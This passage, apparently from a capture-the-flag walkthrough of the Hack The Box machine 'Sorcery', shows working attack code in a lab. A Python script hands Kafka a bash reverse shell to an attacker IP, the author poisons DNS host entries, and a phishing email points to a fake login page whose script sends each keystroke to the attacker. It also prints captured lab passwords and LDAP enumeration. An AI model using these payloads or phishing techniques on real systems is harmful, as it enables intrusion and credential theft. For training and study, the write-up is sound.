    Key=10  min=0  max=4
    Key=11  min=0  max=9
    Key=12  min=0  max=4
    Key=13  min=0  max=5
    Key=14  min=0  max=5
    Key=15  min=0  max=5
    Key=16  min=0  max=4
    Key=17  min=0  max=1
    Key=18  min=0  max=3
    Key=19  min=0  max=7
    Key=20  min=0  max=6
    Key=21  min=0  max=2
    Key=22  min=0  max=4
    Key=23  min=0  max=4
    Key=24  min=0  max=4
    Key=25  min=0  max=3
    Key=26  min=0  max=3
    Key=27  min=0  max=1
    Key=28  min=0  max=3
    Key=29  min=0  max=3
    Key=30  min=0  max=3
    Key=31  min=0  max=3
    Key=32  min=0  max=4
    Key=33  min=0  max=2
    Key=34  min=0  max=2
    Key=35  min=0  max=4
    Key=36  min=0  max=2
    Key=37  min=0  max=3
    Key=38  min=0  max=3
    Key=39  min=0  max=2
    Key=40  min=0  max=2
    Key=41  min=0  max=3
    Key=42  min=0  max=2
    Key=43  min=0  max=2
    Key=44  min=0  max=1
    Key=45  min=0  max=0
    Key=46  min=0  max=0
    Key=47  min=0  max=0
    Key=48  min=0  max=1
    Key=49  min=0  max=1
    Key=50  min=0  max=0
    Key=51  min=0  max=0
    Key=55  min=0  max=1
    Key=57  min=0  max=1
    Key=60  min=0  max=1
    Key=61  min=0  max=0
    Key=64  min=0  max=0
    Key=65  min=0  max=0
    Key=66  min=0  max=0
    Key=68  min=0  max=0
    Key=74  min=0  max=0


Conclusion:

Your broker is running Kafka 3.6.x (or newer)!

This is the first version to support the ZookeeperMigration API (key 74).  
Fetch v16 and Metadata v12 are only available in 3.6.x+.


With that information confirmed, let's go straight to producing a request to the 9092 kafka port...


```python
import struct
import socket
import zlib
import json

def kafka_string(s):
    if s is None:
        return struct.pack(">h", -1)
    enc = s.encode("utf-8")
    return struct.pack(">h", len(enc)) + enc

def kafka_bytes(b):
    if b is None:
        return struct.pack(">i", -1)
    return struct.pack(">i", len(b)) + b

def build_message(value_bytes):
    magic = 0
    attributes = 0
    key = None
    msg_body = struct.pack(">bb", magic, attributes)
    msg_body += kafka_bytes(key)
    msg_body += kafka_bytes(value_bytes)
    crc = zlib.crc32(msg_body) & 0xffffffff
    msg = struct.pack(">I", crc) + msg_body
    return msg

def build_message_set(message):
    offset = 0
    msgset = struct.pack(">q", offset)
    msgset += struct.pack(">i", len(message))
    msgset += message
    return msgset

def build_produce_request(topic, value_bytes, correlation_id=1, client_id="copilot"):
    # Build MessageSet
    message = build_message(value_bytes)
    msgset = build_message_set(message)
    required_acks = 0
    timeout = 5000
    partition = 0
    body = struct.pack(">h", required_acks)
    body += struct.pack(">i", timeout)
    body += struct.pack(">i", 1)           # topics array length
    body += kafka_string(topic)
    body += struct.pack(">i", 1)           # partitions array length
    body += struct.pack(">i", partition)
    body += struct.pack(">i", len(msgset))
    body += msgset

    # Produce header
    api_key = 0      # Produce
    api_version = 2  # MessageSet compatible
    header = struct.pack(">hhih", api_key, api_version, correlation_id, len(client_id))
    header += client_id.encode("utf-8")

    request = header + body
    request = struct.pack(">i", len(request)) + request
    return request

payload_str = b"/bin/bash -i 5<> /dev/tcp/10.10.14.31/9999 0<&5 1>&5 2>&5"
payload2 = [{"name": "notes.sorcery.htb", "value": "10.10.14.31"},{"name": "gitea.sorcery.htb", "value": "10.10.14.31"},{"name": "git.sorcery.htb", "value": "10.10.14.31"}]
# Just send the base64 string as the value (as per your sample)
value_bytes = payload_str
value_bytes2 = json.dumps(payload2).encode()

# Build the request
hex_string_request_update = build_produce_request("update", value_bytes).hex()
hex_string_request_get = build_produce_request("get", value_bytes2).hex()

print(f'"Update" Topic: {hex_string_request_update}')
print(f'"Get" Topic: {hex_string_request_get}')

# For whatever reason, sending through this interface doesn't work and I had to do this directly int he UI
#with requests.Session() as s:
#    print("Getting cluster IDs from Kafka REST Proxy")
#    cluster_response = sendPortData(s, token, "kafka", 9092, [hex_string_request_get], keepalive=True, expectresponse=True, debug=True)
```

    "Update" Topic: 0000008200000002000000010007636f70696c6f74000000001388000000010006757064617465000000010000000000000053000000000000000000000047a6fdb4590000ffffffff000000392f62696e2f62617368202d6920353c3e202f6465762f7463702f31302e31302e31342e33312f3939393920303c263520313e263520323e2635
    "Get" Topic: 000000e900000002000000010007636f70696c6f740000000013880000000100036765740000000100000000000000bd0000000000000000000000b14c1a375e0000ffffffff000000a35b7b226e616d65223a20226e6f7465732e736f72636572792e687462222c202276616c7565223a202231302e31302e31342e3331227d2c207b226e616d65223a202267697465612e736f72636572792e687462222c202276616c7565223a202231302e31302e31342e3331227d2c207b226e616d65223a20226769742e736f72636572792e687462222c202276616c7565223a202231302e31302e31342e3331227d5d


Again we needed to send this data directly to the web UI, but it worked! Even wth no response from the web portal, we are able to both: Pop a reverse shell, and update the reported DNS entries in kafka.

Unfortunately the DNS entries in kafka were insufficient to get our target to resolve our domain, TCPDump found no inbound traffic when sending our campaign mail. We ultimately needed to update the /dns/users-host file on the reverse shell and kill dnsmasq to trigger a restart by supervisord.

## Kafka reloaded

The below was what I attempted to do through the kafka rest-proxy. When I found this was open, I determined it should be MUCH easier to send data through an API than through a protocol, right? No not at all. However, now that I have the benefit of both hindsight and root, lets see if we can get a working payload this time with what I believe is the intended path.

I used the v3 endpoints here because, at the time, they would at least give back some indication of success in the form of 200 responses, but no other data came back.

```
('0:["$@1",["eMXTkHuLPViqV0QpNTSCV",null]]\n'
 '1:{"result":{"data":["485454502f312e3120323030204f4b0d0a446174653a205361742c203231204a756e20323032352030313a35373a313920474d540d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6a736f6e0d0a566172793a204163636570742d456e636f64696e672c20557365722d4167656e740d0a5472616e736665722d456e636f64696e673a206368756e6b65640d0a0d0a"]}}\n')
('0:["$@1",["eMXTkHuLPViqV0QpNTSCV",null]]\n'
 '1:{"result":{"data":["485454502f312e3120323030204f4b0d0a446174653a205361742c203231204a756e20323032352030313a35373a323420474d540d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6a736f6e0d0a566172793a204163636570742d456e636f64696e672c20557365722d4167656e740d0a5472616e736665722d456e636f64696e673a206368756e6b65640d0a0d0a"]}}\n')
0 HTTP/1.1 200 OK
Date: Sat, 21 Jun 2025 01:57:19 GMT
Content-Type: application/json
Vary: Accept-Encoding, User-Agent
Transfer-Encoding: chunked


0 HTTP/1.1 200 OK
Date: Sat, 21 Jun 2025 01:57:24 GMT
Content-Type: application/json
Vary: Accept-Encoding, User-Agent
Transfer-Encoding: chunked
```
With the power of root, Yugi Moto, and docker logs, I can see these responded as such:

```log
[2025-06-21 01:58:19,022] INFO 172.19.0.4 - - [21/Jun/2025:01:57:19 +0000] "POST /v3/clusters/pXWI6g0JROm4f-1iZ_YH0Q/topics/get/records HTTP/1.1" 200 0 "-" "-" 60007 - (io.confluent.rest-utils.requests)
[2025-06-21 01:58:19,023] ERROR Error when writing streaming result to response channel. (io.confluent.kafkarest.response.StreamingResponse)
org.eclipse.jetty.io.EofException
```

So even on the remote end i see 200s, however I don't see the topic working as expected.
```


```python
import base64
import json
from chepy import Chepy
#### PAYLOADSS ####
dns = {
  "value": {
    "type": "JSON",
    "data": [
      {
        "name": "git.sorcery.htb",
        "value": "10.10.14.31"
      }
    ]
  }
}

update = {
  "value": {
    "type": "BINARY",
    "data": base64.b64encode(b"/bin/bash -i >& /dev/tcp/10.10.14.31/9999 0>&1").decode()
  }
}


#### HTTP HEADERS & REQUEST ####
requestjson = [
    "POST /v3/clusters/pXWI6g0JROm4f-1iZ_YH0Q/topics/get/records HTTP/1.1\r\n",
    "Host: rest-proxy\r\n",
    "Content-Type: application/json\r\n",
    f"Content-Length: {len(json.dumps(dns))}\r\n",
    "\r\n",
    json.dumps(dns),
    "\r\n"
]

requestbinary = [
    "POST /v3/clusters/pXWI6g0JROm4f-1iZ_YH0Q/topics/update/records HTTP/1.1\r\n",
    "Host: rest-proxy\r\n",
    "Content-Type: application/json\r\n",
    f"Content-Length: {len(json.dumps(update))}\r\n",
    "\r\n",
    json.dumps(update),
    "\r\n"
]


with requests.Session() as s:
    print("Generating record in Kafka")
    kafkaresponse1 = sendPortData(s, token, "kafka", 8082, [requestjson], keepalive=True, expectresponse=True, debug=True)
    # kafkaresponse2 = sendPortData(s, token, "kafka", 8082, [requestbinary], keepalive=True, expectresponse=True, debug=True)
    for idx, line in enumerate(kafkaresponse1):
        print(idx, Chepy(line).from_hex().o.decode())
    #for idx, line in enumerate(kafkaresponse2):
    #    print(idx, Chepy(line).from_hex().o.decode())


```

    Generating record in Kafka


    ('0:["$@1",["eMXTkHuLPViqV0QpNTSCV",null]]\n'
     '1:{"result":{"data":["485454502f312e3120323030204f4b0d0a446174653a205361742c203231204a756e20323032352030323a34373a333320474d540d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6a736f6e0d0a566172793a204163636570742d456e636f64696e672c20557365722d4167656e740d0a5472616e736665722d456e636f64696e673a206368756e6b65640d0a0d0a"]}}\n')
    0 HTTP/1.1 200 OK
    Date: Sat, 21 Jun 2025 02:47:33 GMT
    Content-Type: application/json
    Vary: Accept-Encoding, User-Agent
    Transfer-Encoding: chunked
    
    


The below consumer registrations seemed to work fine.


```python
# FOR "UPDATE" CONSUMER

clean_update_consumer_request = [
    "DELETE /consumers/malicious_group/instances/explorerupdate HTTP/1.1\r\n",
    "Host: rest-proxy:8082\r\n",
    "\r\n"
]

create_update_consumer_payload = json.dumps({
    "name": "explorerupdate",
    "format": "binary",
    "auto.offset.reset": "earliest",
    "auto.commit.enable": "false",
    "fetch.min.bytes": "1"
})

create_update_consumer_request = [
    "POST /consumers/malicious_group HTTP/1.1\r\n",
    "Host: rest-proxy:8082\r\n",
    "Content-Type: application/vnd.kafka.binary.v2+json\r\n",
    f"Content-Length: {len(create_update_consumer_payload)}\r\n",
    "\r\n",
    create_update_consumer_payload
]

subscribe_update_payload = json.dumps({
    "topics": ["update"] 
})

subscribe_update_request = [
    "POST /consumers/malicious_group/instances/explorerupdate/subscription HTTP/1.1\r\n",
    "Host: rest-proxy:8082\r\n",
    "Content-Type: application/vnd.kafka.binary.v2+json\r\n",
    f"Content-Length: {len(subscribe_update_payload)}\r\n",
    "\r\n",
    subscribe_update_payload
]

with requests.Session() as s:
    print("Create consumer")
    createConsumer = sendPortData(s, token, "kafka", 8082, [clean_update_consumer_request, create_update_consumer_request, subscribe_update_request], keepalive=False, expectresponse=True, debug=False)
    for y in [Chepy(x).from_hex().o.decode() for x in createConsumer]:
        print(y)
```

    Create consumer
    HTTP/1.1 404 Not Found
    Date: Sat, 21 Jun 2025 02:28:35 GMT
    Content-Type: application/vnd.kafka.v2+json
    Transfer-Encoding: chunked
    
    3D
    {"error_code":40403,"message":"Consumer instance not found."}
    0
    
    
    HTTP/1.1 200 OK
    Date: Sat, 21 Jun 2025 02:28:40 GMT
    Content-Type: application/vnd.kafka.v2+json
    Vary: Accept-Encoding, User-Agent
    Transfer-Encoding: chunked
    
    77
    {"instance_id":"explorerupdate","base_uri":"http://rest-proxy:8082/consumers/malicious_group/instances/explorerupdate"}
    0
    
    
    HTTP/1.1 204 No Content
    Date: Sat, 21 Jun 2025 02:28:45 GMT
    
    



```python
# FOR "UPDATE" CONSUMER

fetch_update_topics_request = [
    "GET /consumers/malicious_group/instances/explorerupdate/subscription HTTP/1.1\r\n",
    "Host: rest-proxy:8082\r\n",
    "Accept: application/vnd.kafka.v2+json\r\n",
    "\r\n"
]

fetch_update_messages_request = [
    "GET /consumers/malicious_group/instances/explorerupdate/records?timeout=1000 HTTP/1.1\r\n",
    "Host: rest-proxy\r\n",
    "Accept: application/vnd.kafka.binary.v2+json\r\n",
    "\r\n"
]

with requests.Session() as s:
    print("Get topics relevant to consumer")
    fetchTopics = sendPortData(s, token, "kafka", 8082, [fetch_update_topics_request, fetch_update_messages_request], keepalive=False, expectresponse=True, debug=True)
    for y in [Chepy(x).from_hex().o.decode() for x in fetchTopics]:
        print(y)
```

    Get topics relevant to consumer
    ('0:["$@1",["eMXTkHuLPViqV0QpNTSCV",null]]\n'
     '1:{"result":{"data":["485454502f312e3120323030204f4b0d0a446174653a205361742c203231204a756e20323032352030323a30343a333120474d540d0a436f6e74656e742d547970653a206170706c69636174696f6e2f766e642e6b61666b612e76322b6a736f6e0d0a566172793a204163636570742d456e636f64696e672c20557365722d4167656e740d0a5472616e736665722d456e636f64696e673a206368756e6b65640d0a0d0a31350d0a7b22746f70696373223a5b22757064617465225d7d0d0a300d0a0d0a",""]}}\n')
    HTTP/1.1 200 OK
    Date: Sat, 21 Jun 2025 02:04:31 GMT
    Content-Type: application/vnd.kafka.v2+json
    Vary: Accept-Encoding, User-Agent
    Transfer-Encoding: chunked
    
    15
    {"topics":["update"]}
    0
    
    
    


So I can see that I can indeed interact with the environment, just maybe not the topics themselves.

And after much sleuthing, log dumping, parsing around the remote environment this is what I believe is the issue:

```sh
[appuser@e5cc63ffe209 kafka-rest]$ cat kafka-rest.properties 
bootstrap.servers=localhost:29092
host.name=rest-proxy
listeners=http://0.0.0.0:8082
```

The bootstrap server is both: not on a host that will re-advertise as the appropriate hsot (kafka) and not on a port that's listening to bootstrap traffic (should be 9092). 

If someone has a better idea why this doesn't work for producers but does work for consumers, though; I'd love to know.

After posting the update topic with a reverse shell we get on the dns container. Remember that we need to have a valid subdomain that our victim can use to get to us. Let's add a few.

If we look at the running processes for the container, we can see dnsmasq running, and that it's loading two files to serve: /dns/hosts which is root owned and managed, and /dns/hosts-user which is free for us to make our home. 

Let's just add our endopints to that file and reload the service by killing it so supervisord will pick it back up again.

```sh
user@7bfb70ee5b9c:/dns$ echo "10.10.14.31 git.sorcery.htb" > hosts-user
echo "10.10.14.31 git.sorcery.htb" > hosts-user
user@7bfb70ee5b9c:/dns$ echo "10.10.14.31 toku.sorcery.htb" >> hosts-user
echo "10.10.14.31 toku.sorcery.htb" >> hosts-user
user@7bfb70ee5b9c:/dns$ echo "10.10.14.31 notes.sorcery.htb" >> hosts-user
echo "10.10.14.31 notes.sorcery.htb" >> hosts-user

user@7bfb70ee5b9c:/proc$ cat /dns/hosts-users
cat /dns/hosts-user
10.10.14.31 git.sorcery.htb
10.10.14.31 toku.sorcery.htb
10.10.14.31 notes.sorcery.htb

user@7bfb70ee5b9c:/dns$ ps -ef
ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 17:33 ?        00:00:00 /bin/bash /docker-entrypoint.sh
root           7       1  0 17:33 ?        00:00:01 /usr/bin/python3 /usr/bin/supervisord -c /etc/supervisor/supervisord.conf
root           8       7  0 17:33 ?        00:00:00 sh -c while true; do printf "READY\n"; read line; kill -9 $PPID; printf "RESULT 2\n"; printf "OK"; done
user           9       7  0 17:33 ?        00:00:00 /app/dns
user          10       7  0 17:33 ?        00:00:00 /usr/sbin/dnsmasq --no-daemon --addn-hosts /dns/hosts-user --addn-hosts /dns/hosts
user          11       9  0 17:38 ?        00:00:00 bash -c /bin/bash -i 5<> /dev/tcp/10.10.14.31/9999 0<&5 1>&5 2>&5
user          12      11  0 17:38 ?        00:00:00 /bin/bash -i
user          22      12  0 17:43 ?        00:00:00 ps -ef
user@7bfb70ee5b9c:/dns$ kill 10
kill 10
user@7bfb70ee5b9c:/dns$ /usr/sbin/dnsmasq --addn-hosts /dns/hosts-user --addn-hosts /dns/hosts
<-addn-hosts /dns/hosts-user --addn-hosts /dns/hosts
user@7bfb70ee5b9c:/dns$ ps -ef
ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 17:33 ?        00:00:00 /bin/bash /docker-entrypoint.sh
root           7       1  0 17:33 ?        00:00:01 /usr/bin/python3 /usr/bin/supervisord -c /etc/supervisor/supervisord.conf
root           8       7  0 17:33 ?        00:00:00 sh -c while true; do printf "READY\n"; read line; kill -9 $PPID; printf "RESULT 2\n"; printf "OK"; done
user           9       7  0 17:33 ?        00:00:00 /app/dns
user          11       9  0 17:38 ?        00:00:00 bash -c /bin/bash -i 5<> /dev/tcp/10.10.14.31/9999 0<&5 1>&5 2>&5
user          12      11  0 17:38 ?        00:00:00 /bin/bash -i
user          25       1  0 17:44 ?        00:00:00 /usr/sbin/dnsmasq --addn-hosts /dns/hosts-user --addn-hosts /dns/hosts
user          26      12  0 17:44 ?        00:00:00 ps -ef

## The Phishing Campaign

We can finally start the campaign as we have all the tools!


```python
smtpsendemail = [
    "EHLO sorcery.htb\r\n",
    "MAIL FROM:<nicole_sullivan@sorcery.htb>\r\n",
    "RCPT TO:<tom_summers@sorcery.htb>\r\n",
    "DATA\r\n",
    "From: Nicole Sullivan <nicole_sullivan@sorcery.htb>\r\n",
    "To: Tom Summers <tom_summers@sorcery.htb>\r\n",
    "Subject: Notes from Wednesday's meeting\r\n",
    "Date: Wed, 14 Jun 2023 10:00:00 -0400\r\n",
    "\r\n",
    "Log into the notes server and try some stuff https://notes.sorcery.htb\r\n",
    ".\r\n",
    "QUIT\r\n"
]

checkqueue = [
    "GET /api/v2/messages HTTP/1.1\r\nHost: mail\r\n\r\n"
]

with requests.Session() as s:
    smtpInitialize = sendPortData(s, token, "mail", 1025, [smtpsendemail], keepalive=False, expectresponse=True)
    smtpresponse = Chepy(smtpInitialize[0]).from_hex().o.decode()
    print(smtpresponse)
    checkMail = sendPortData(s, token, "mail", 8025, [checkqueue], keepalive=False, expectresponse=True)
    mailresponse = Chepy(checkMail).from_hex().o.decode()
    print(mailresponse)

```

    220 mailhog.example ESMTP MailHog
    250-Hello sorcery.htb
    250-PIPELINING
    250 AUTH PLAIN
    250 Sender nicole_sullivan@sorcery.htb ok
    250 Recipient tom_summers@sorcery.htb ok
    354 End data with <CR><LF>.<CR><LF>
    250 Ok: queued as 8JzUkUVB9hi0A5uL22rwnqFZurauGXmqAnA9EhJxAnk=@mailhog.example
    221 Bye
    
    HTTP/1.1 200 OK
    Content-Type: text/json
    Date: Thu, 19 Jun 2025 18:51:41 GMT
    Transfer-Encoding: chunked
    
    e645
    {"total":66,"count":50,"start":0,"items":[{"ID":"8JzUkUVB9hi0A5uL22rwnqFZurauGXmqAnA9EhJxAnk=@mailhog.example","From":{"Relays":null,"Mailbox":"nicole_sullivan","Domain":"sorcery.htb","Params":""},"To":[{"Relays":null,"Mailbox":"tom_summers","Domain":"sorcery.htb","Params":""}],"Content":{"Headers":{"Date":["Wed, 14 Jun 2023 10:00:00 -0400"],"From":["Nicole Sullivan \u003cnicole_sullivan@sorcery.htb\u003e"],"Message-ID":["8JzUkUVB9hi0A5uL22rwnqFZurauGXmqAnA9EhJxAnk=@mailhog.example"],"Received":
    ...
    id S1DxQ-7-aIle6DArhiSNRb1ytWJ-eYF1zfWf3fgyn80=@mailhog.example; Thu, 19 Jun 2025 17:50:28 +0000"],"Return-Path":["\u003ctom_summers@sorcery.htb\u003e"],"Subject":["Notes from Wednesday's meeting"],"To":["Nicole Sullivan \u003cnicole_sullivan@sorcery.htb\u003e"]},"Body":"Check out \u003ca href='https://git.sorcery.htb'\u003ehttps://git.sorcery.htb\u003c/a\u003e really quick, thanks. Or https://gitea.sorcery.htb or https://notes.sorcery.htb","Size":321,"MIME":null},"Created":"2025-06-19T17:50:28.899407985Z","MIME":null,"Raw":{"From":"tom_summers@sorcery.htb","To":["nicole_sullivan@sorcery.htb"],"Data":"From: Tom \u003ctom_summers@sorcery.htb\u003e\r\nTo: Nicole Sullivan \u003cnicole_sullivan@sorcery.htb\u003e\r\nSubject: Notes from Wednesday's meeting\r\nDate: Wed, 14 Jun 2023 10:00:00 -0400\r\n\r\nCheck out \u003ca href='https://git.sorcery.htb'\u003ehttps://git.sorcery.htb\u003c/a\u003e really quick, thanks. Or https://gitea.sorcery.htb or https://notes.sorcery.htb","Helo":"sorcery.htb"}}]}
    0
    
    


The site I'm hosting is at notes.sorcery.htb and is added to dns with a few extras just in case I want them later. 

Initially I attempted to spin up a gitea container with the intent to intercept the traffic in flight, but no requests were being sent by the user after the initial web call and XSS attempts. My friend had the idea to use the eventListener to see if the user might be typing, and lo and behold!

The content is a simple flask site with the following payload:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
</head>
<body>
    <form id="loginForm" method="POST" action="/">
        <label for="user_name">Username or Email Address</label>
        <!-- These values I took from the gitea login page -->
        <input type="text" id="user_name" name="user_name" required>
        <br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        <br><br>
        <button type="submit">Log In</button>
    </form>
    <script>
    document.getElementById('loginForm').addEventListener('keyup', function() {
        // Gather form data
        const form = this;
        const data = {};
        Array.from(form.elements).forEach(el => {
            if (el.name) data[el.name] = el.value;
        });
        // Send fetch request with the current form data
        fetch('https://notes.sorcery.htb/keystroke', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        });
    });
    </script>
</body>
</html>
```

On my flask side I have the following to catch the keystrokes:

```python
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        username = request.form.get("user_name")
        password = request.form.get("password")
        print(f"Username: {username}")
        print(f"Password: {password}")
        return "Credentials received!"
    print(f"Full URL: {request.url}")
    print(f"Query string: {request.query_string.decode()}")
    print(f"Cookies: {dict(request.cookies)}")
    return render_template_string(HTML)

@app.route('/keystroke', methods=['POST'])
def keystroke():
    data = request.get_json()
    print(f"Keystroke data received: {data}")
    return '', 204
```

The motherlode!
```log
Keystroke data received: {'user_name': 'tom_summers', 'password': 'jNsMKQ6k2.XDMPu.'}
```
And with that, we're finally in! This was BY FAR the hardest part of this box. In comparison, the rest of this could have been an easy box rating, no problem.
```sh
(.venv)  /infrastructure  ssh sorcery.htb -l tom_summers    
(tom_summers@sorcery.htb) Password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Jun 19 18:52:39 2025 from 10.10.14.31
tom_summers@main:~$ ls
user.txt
tom_summers@main:~$ cat user.txt 
af59b6c224301f0a7aae1775ff8152c2
```
## Onwards to Root!

Initial enumeration got me VERY lucky, as I had happened to do a ps EXACTLY as an admin script was resetting a user password. 

Later on I'll run [PsPy](https://github.com/DominicBreuker/pspy) to watch for changes in the ps list and find a few other cleanup items that happen along with ash_winter's password, however they're not as useful as this.

There may have been another intended path that was longer around as there's references to a tom_summers_admin, a donna_adams sysadmin, and a rebecca_smith htaccess: but none of these I needed. I suspect that rebecca_smith's password was a randomly changing password that gave access to port 5000 accessible from the box or an ssh proxy from Tom, but I didn't go that direction because I dont' need that negativity in my life after Kafka. Next time if I'm not supposed to see clear text passwords in ps, just cat it out of a file that you dangle in front of my face instead!
```log
admin     144033  139708  2 18:53 ?        00:00:00 /usr/bin/python3 -I /usr/bin/ipa user-mod ash_winter --setattr userPassword=w@LoiU8Crmdep
root      144103       2  0 18:53 ?        00:00:00 [kworker/3:1-rcu_par_gp]
root      144113       2  0 18:53 ?        00:00:00 [kworker/0:2-rcu_par_gp]
root      144562       2  0 18:53 ?        00:00:00 [kworker/0:3-rcu_par_gp]
root      144915    2029 50 18:53 ?        00:00:00 runc --root /var/run/docker/runtime-runc/moby-165536.165536 --log /run/containerd/io.containerd.runtime.v2.task/moby-165536.165536/e5cc63ffe2096d192a2362206a4a9
tom_sum+  144921  142925 99 18:53 pts/0    00:00:00 ps -ef
tom_summers@main:~$ 
```
Using pspy:

```log
2025/06/19 20:01:42 CMD: UID=1638400000 PID=356368 | /usr/bin/python3 -I /usr/bin/ipa sudorule-find 

2025/06/19 20:02:01 CMD: UID=0     PID=356890 | /bin/bash /provision/cron/root/otp.sh 
2025/06/19 20:02:01 CMD: UID=2002  PID=356891 | /bin/bash /provision/cron/tom_summers_admin/text-editor.sh 
2025/06/19 20:02:01 CMD: UID=0     PID=356893 | /bin/bash /provision/cron/root/otp.sh 
2025/06/19 20:02:01 CMD: UID=2002  PID=356898 | 
2025/06/19 20:02:01 CMD: UID=2002  PID=356899 | /bin/sh -c /provision/cron/tom_summers_admin/xorg.sh 
2025/06/19 20:02:01 CMD: UID=2002  PID=356903 | /bin/bash /provision/cron/tom_summers_admin/xorg.sh 
2025/06/19 20:02:01 CMD: UID=0     PID=356921 | /bin/bash /provision/cron/root/otp.sh 
2025/06/19 20:02:01 CMD: UID=0     PID=356922 | htpasswd -Bbc /home/vagrant/source/registry/auth/registry.password rebecca_smith -7eAZDp9-f9mg659549 


2025/06/19 20:03:21 CMD: UID=1638400000 PID=359133 | /usr/bin/python3 -I /usr/bin/ipa user-mod ash_winter --setattr userPassword=w@LoiU8Crmdep 
```
This user had more permissions than Tom, and poor Tom isn't trusted to do anything so I'm moving on.

```sh
(.venv)  /infrastructure  ssh sorcery.htb -l ash_winter
(ash_winter@sorcery.htb) Password: 
Password expired. Change your password now.
(ash_winter@sorcery.htb) Current Password: 
(ash_winter@sorcery.htb) New password: 
(ash_winter@sorcery.htb) Retype new password: 
Creating directory '/home/ash_winter'.
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

-sh: 32: [[: not found
-sh: 32: Thu Jun 19 18:54:54 2025: not found
Last login: Thu Jun 19 18:54:54 2025 from 10.10.14.31
$ 
```
Another thing we find, in the same ps output, is use of [IPA](https://www.freeipa.org/page/Documentation.html).  
Using some [cheatsheets](https://angelica.gitbook.io/hacktricks/linux-hardening/freeipa-pentesting), we can read a bit about methods that we might need to enumerate this Temu AD.

https://book.hacktricks.wiki/en/linux-hardening/freeipa-pentesting.html

```sh
# Get all users of domain
ldapsearch -Y gssapi -b "cn=users,cn=compat,dc=sorcery,dc=htb"

# Get users groups
ldapsearch -Y gssapi -b "cn=groups,cn=accounts,dc=sorcery,dc=htb"

# Get all the hosts
ldapsearch -Y gssapi -b "cn=computers,cn=accounts,dc=sorcery,dc=htb"

# Get hosts groups
ldapsearch -Y gssapi -b "cn=hostgroups,cn=accounts,dc=sorcery,dc=htb"
```
However umping all of ldapsearch, we can see a whole lot of data, and crawling through it we see a few juicy targets:

```sh
ash_winter@main:~$ ldapsearch
...
# ash_winter, users, accounts, sorcery.htb
dn: uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb
givenName: ash
sn: winter
uid: ash_winter
cn: ash winter
displayName: ash winter
initials: aw
gecos: ash winter
krbPrincipalName: ash_winter@SORCERY.HTB
objectClass: top
objectClass: person
objectClass: organizationalperson
objectClass: inetorgperson
objectClass: inetuser
objectClass: posixaccount
objectClass: krbprincipalaux
objectClass: krbticketpolicyaux
objectClass: ipaobject
objectClass: ipasshuser
objectClass: ipaSshGroupOfPubKeys
objectClass: mepOriginEntry
objectClass: ipantuserattrs
loginShell: /bin/sh
homeDirectory: /home/ash_winter
mail: ash_winter@sorcery.htb
krbCanonicalName: ash_winter@SORCERY.HTB
ipaUniqueID: c862fa48-96eb-11ef-9f47-0242ac170002
uidNumber: 1638400004
gidNumber: 1638400004
ipaNTSecurityIdentifier: S-1-5-21-820725746-4072777037-1046661441-1004
memberOf: cn=ipausers,cn=groups,cn=accounts,dc=sorcery,dc=htb
memberOf: cn=add_sysadmin,cn=roles,cn=accounts,dc=sorcery,dc=htb # <--- We can see something about adding to sysadmin
memberOf: cn=add_sysadmin,cn=privileges,cn=pbac,dc=sorcery,dc=htb
memberOf: cn=add_sysadmin,cn=permissions,cn=pbac,dc=sorcery,dc=htb
memberOf: ipaUniqueID=c4f41b80-96eb-11ef-9cbc-0242ac170002,cn=hbac,dc=sorcery,
 dc=htb
memberOf: ipaUniqueID=c54549ba-96eb-11ef-9408-0242ac170002,cn=hbac,dc=sorcery,
 dc=htb
krbLastPwdChange: 20250621031401Z
krbPasswordExpiration: 20250621031401Z

# cd848e9c-96eb-11ef-b154-0242ac170002, sudorules, sudo, sorcery.htb
dn: ipaUniqueID=cd848e9c-96eb-11ef-b154-0242ac170002,cn=sudorules,cn=sudo,dc=s
 orcery,dc=htb
cn: allow_sudo
hostCategory: all
cmdCategory: all
ipaSudoRunAsUserCategory: all
ipaSudoRunAsGroupCategory: all
objectClass: ipaassociation
objectClass: ipasudorule
ipaEnabledFlag: TRUE
ipaUniqueID: cd848e9c-96eb-11ef-b154-0242ac170002
memberUser: uid=admin,cn=users,cn=accounts,dc=sorcery,dc=htb # <--- We can see a special user hiding in something called allow_sudo with cmdCategory "all" which sounds pretty juicy

# sysadmins, groups, accounts, sorcery.htb
dn: cn=sysadmins,cn=groups,cn=accounts,dc=sorcery,dc=htb
cn: sysadmins
objectClass: top
objectClass: groupofnames
objectClass: nestedgroup
objectClass: ipausergroup
objectClass: ipaobject
objectClass: posixgroup
objectClass: ipantgroupattrs
ipaUniqueID: d038b410-96eb-11ef-ace5-0242ac170002
gidNumber: 1638400005
ipaNTSecurityIdentifier: S-1-5-21-820725746-4072777037-1046661441-1005
memberOf: cn=manage_sudorules_ldap,cn=roles,cn=accounts,dc=sorcery,dc=htb # <--- We can see something about managing sudo roles
memberOf: cn=manage_sudorules_ldap,cn=privileges,cn=pbac,dc=sorcery,dc=htb
memberOf: cn=manage_sudorules_ldap,cn=permissions,cn=pbac,dc=sorcery,dc=htb
```

